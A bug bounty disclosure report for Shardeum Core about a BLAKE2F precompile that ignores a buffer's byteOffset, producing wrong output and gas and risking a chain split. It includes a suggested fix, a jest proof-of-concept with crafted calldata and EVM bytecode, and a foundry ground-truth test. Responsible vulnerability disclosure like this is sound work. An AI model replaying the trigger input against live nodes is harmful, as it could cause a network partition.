# 33520 - \[BC - Insight] Inconsistent consensus issue for BlakeF precomp...

Submitted on Jul 22nd 2024 at 14:02:09 UTC by @ret2happy for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33520

Report type: Blockchain/DLT

Report severity: Insight

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Unintended chain split (network partition)

## Description

## Brief/Intro

There exists a wrong implementation in the precompile `0x9`. When calculate the output involved with non-zero aligned inputs, the output and the gas result is totally wrong. This would lead to the wrong gas usage and further wrong result with the correct EVM-consensus implemented validator, resulting the network partition.

## Vulnerability Details

In the precompile function of \[1], it decodes the `rounds` and the following parameters `hRaw`,`mRaw`,`tRaw` using the beginning buffer of the `data`. However, the `data` buffer could have offset and when the offset is non-zero, the decoded parameter is wrong. The official definition of the Blake precompile could be found in \[2].

```

export function precompile09(opts: PrecompileInput): ExecResult {
  ...

  const rounds = new DataView(data.subarray(0, 4).buffer).getUint32(0) // [1] wrong align for the 
  const hRaw = new DataView(data.buffer, 4, 64)
  const mRaw = new DataView(data.buffer, 68, 128)
  const tRaw = new DataView(data.buffer, 196, 16)
```

Take \[1] for example, it decode the first 4 bytes of the data array buffer. However, the byteOffset of the `data` could be non-zero. This result in the wrong memory access (we read the wrong & stale memory data) when calculate the parameter. This further leads to the wrong output result and the gas result.

Hence we need to take `byteOffset` into consideration. Following parameter calculation is an suggested fix:

```
  const rounds = new DataView(data.buffer, data.byteOffset).getUint32(0)
  const hRaw = new DataView(data.buffer, data.byteOffset + 4, 64)
  const mRaw = new DataView(data.buffer, data.byteOffset + 68, 128)
  const tRaw = new DataView(data.buffer, data.byteOffset + 196, 16)
```

## Impact Details

By loading the malicious PoC tx we provided, the contract call result is totally wrong. What's more, the gas calculation is wrong as well. This could lead to the consensus issue within the execution layer. Furthermore, if any dApp using this precompile under this wrong implementation, it could get the wrong & unexpected result, leading to the DoS or fund lock/stolen issue in that case.

## References

\[1] <https://github.com/shardeum/shardeum/blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/evm\\_v2/precompiles/09-blake2f.ts#L184-L187>

\[2] <https://eips.ethereum.org/EIPS/eip-152#12-rounds>

## Proof of Concept

## PoC

I write a PoC which runs transaction on the shardeum network under the `test/testCases` directory:

```
// file: test/testCases/transactionsPoC.test.ts
import { Common, Hardfork} from '@ethereumjs/common'
import { EVM as EthereumVirtualMachine } from '../../src/evm_v2'
import {
  Address, bytesToHex, hexToBytes
} from '@ethereumjs/util'
import { DefaultStateManager } from '@ethereumjs/statemanager'

// eslint-disable-next-line no-undef
describe('Precompiles: BLAKE2F', () => {
  it('BLAKE2F PoC', async () => {
    let evmCommon = new Common({ chain: 'mainnet', hardfork: Hardfork.Istanbul, eips: [3855] })
    const calldata =
            '0x0000000c28c9bdf267e6096a3ba7ca8485ae67bb2bf894fe72f36e3cf1361d5f3af54fa5d182e6ad7f520e511f6c3e2b8c68059b3dd8338ed89de6791854126751ac933302810c04147014e9eb472e4dbc09d3c96abb531c9ae39c9e6c454cb83913d688795e237837d30258d11ea7c75201003000454cb83913d688795e237837d30258d11ea7c752011af5b8015c64d39ab44c60ead8317f9f5a9b6c4c01000000000100ca9a3b000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000'
    const customEVM = new EthereumVirtualMachine({
      common: evmCommon,
      stateManager: new DefaultStateManager()
    })
    const code = `0x366000602037600080366020600060095AF1593D6000593E3D90F3`
    await customEVM.stateManager.putContractCode(Address.zero(), hexToBytes(code))
    try {
      let runTxResult = await customEVM.runCall(
        {
          data: hexToBytes(calldata),
          to: Address.zero()
        }
      )
      console.log('return value: ', bytesToHex(runTxResult.execResult.returnValue))
      // correct result:
      // 0x772acbd3f30b0c3f5f53e8b836ab406f7d8d46fd4b27e2ce2ecd67dbf18c958741e2c49d1f1b1a463907a484f970c057dab9684062b82fda69e8a0057e14766f
    } finally {
      customEVM.cleanUp()
    }

  })
})

```

Executing this unit test using `jest test/testCases/transactionsPoC.test.ts`, we would get:

```
  Precompiles: BLAKE2F
    ✓ BLAKE2F PoC (18 ms)

  console.log
    return value:  0x08c9bcf367e6096a3ba7ca8485ae67bb2bf894fe72f36e3cf1361d5f3af54fa5d1487c967f520e511f6c3e2b8c68059b6bbd41fbabd9831f79217e1319cde05b

      at Object.<anonymous> (test/testCases/transactionsPoC.test.ts:27:15)

```

We observe that the return value is `0x08c9bcf367e6096a3ba7ca8485ae67bb2bf894fe72f36e3cf1361d5f3af54fa5d1487c967f520e511f6c3e2b8c68059b6bbd41fbabd9831f79217e1319cde05b`. However, the correct return value should be `0x772acbd3f30b0c3f5f53e8b836ab406f7d8d46fd4b27e2ce2ecd67dbf18c958741e2c49d1f1b1a463907a484f970c057dab9684062b82fda69e8a0057e14766f`. (We will later explain how we get the correct value/ ground truth.)

By applying the suggested fix in the bug description, we get the correct execution result.

#### Ground truth

We use a foundry test to get the correct result since it uses ethereum mainnet as the execution backend. Following is the test file:

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract BlakePoCTest is Test {
    function setUp() public {}
    function testBlakeResult() public {
        address target = address(0x0);
        bytes memory code = hex"366000602037600080366020600060095AF1593D6000593E3D90F3";
        vm.etch(
            target , code 
        );
        (bool success, bytes memory result) = target.call(hex"0000000c28c9bdf267e6096a3ba7ca8485ae67bb2bf894fe72f36e3cf1361d5f3af54fa5d182e6ad7f520e511f6c3e2b8c68059b3dd8338ed89de6791854126751ac933302810c04147014e9eb472e4dbc09d3c96abb531c9ae39c9e6c454cb83913d688795e237837d30258d11ea7c75201003000454cb83913d688795e237837d30258d11ea7c752011af5b8015c64d39ab44c60ead8317f9f5a9b6c4c01000000000100ca9a3b000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000");
        console.log("success:", success);
        console.logBytes(result);
    }
}
```

Install foundry and run:

```
forge test -vvvv
```

You would get the return from running this code:

```
Logs:
  success: true
  0x772acbd3f30b0c3f5f53e8b836ab406f7d8d46fd4b27e2ce2ecd67dbf18c958741e2c49d1f1b1a463907a484f970c057dab9684062b82fda69e8a0057e14766f
```

Also note that the `0x0` address code (i.e., `0x366000602037600080366020600060095AF1593D6000593E3D90F3`) is doing the following things:

```
- copy calldata into memory, with offset 0x20
- call Blake2F precompile with the calldata
- return the data from precompile
```

The asm code of that bytecode is:

```
0x0: CALLDATASIZE
0x1: PUSH1     0x0
0x3: PUSH1     0x20
0x5: CALLDATACOPY
0x6: PUSH1     0x0
0x8: DUP1      
0x9: CALLDATASIZE
0xa: PUSH1     0x20
0xc: PUSH1     0x0
0xe: PUSH1     0x9
0x10: GAS       
0x11: CALL      
0x12: MSIZE     
0x13: RETURNDATASIZE
0x14: PUSH1     0x0
0x16: MSIZE     
0x17: RETURNDATACOPY
0x18: RETURNDATASIZE
0x19: SWAP1     
0x1a: RETURN    
```

You can also verify the result by the RPC call:

```
curl https://eth-mainnet.g.alchemy.com/v2/YOUR_RPC_KEY \
          -X POST \
          -H "Content-Type: application/json" \
          -d '{"jsonrpc":"2.0","method":"eth_call","params": [{"to": "0x0000000000000000000000000000000000000009","data": "0x0000000c28c9bdf267e6096a3ba7ca8485ae67bb2bf894fe72f36e3cf1361d5f3af54fa5d182e6ad7f520e511f6c3e2b8c68059b3dd8338ed89de6791854126751ac933302810c04147014e9eb472e4dbc09d3c96abb531c9ae39c9e6c454cb83913d688795e237837d30258d11ea7c75201003000454cb83913d688795e237837d30258d11ea7c752011af5b8015c64d39ab44c60ead8317f9f5a9b6c4c01000000000100ca9a3b000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000"}, "latest"],"id":1}'
```

Running it you would get:

```
{"jsonrpc":"2.0","id":1,"result":"0x772acbd3f30b0c3f5f53e8b836ab406f7d8d46fd4b27e2ce2ecd67dbf18c958741e2c49d1f1b1a463907a484f970c057dab9684062b82fda69e8a0057e14766f"}%                                                                                                   
```
